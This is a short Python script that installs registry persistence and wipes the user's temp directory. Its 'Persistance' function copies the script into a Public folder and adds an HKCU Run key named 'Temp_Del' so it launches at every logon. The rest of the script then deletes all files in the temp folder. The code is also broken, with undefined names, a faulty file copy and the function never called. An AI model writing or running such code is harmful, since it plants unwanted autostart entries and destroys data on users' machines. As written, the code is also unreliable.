import os, shutil, subprocess

def Persistance():
    Download_Dir = os.environ["Public"] + "\\Del_Temp"
    chdir(Download_Dir)
    shutil.copyfile(__file__, Download_Dir)

    if not os.path.exists(Malocation):
        subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Temp_Del /t REG_SZ /d " + Download_Dir, shell=True)

dir = os.environ["temp"]

for files in os.listdir(dir):
    path = os.path.join(dir, files)
    try:
        shutil.rmtree(path)
    except OSError:
        os.remove(path)
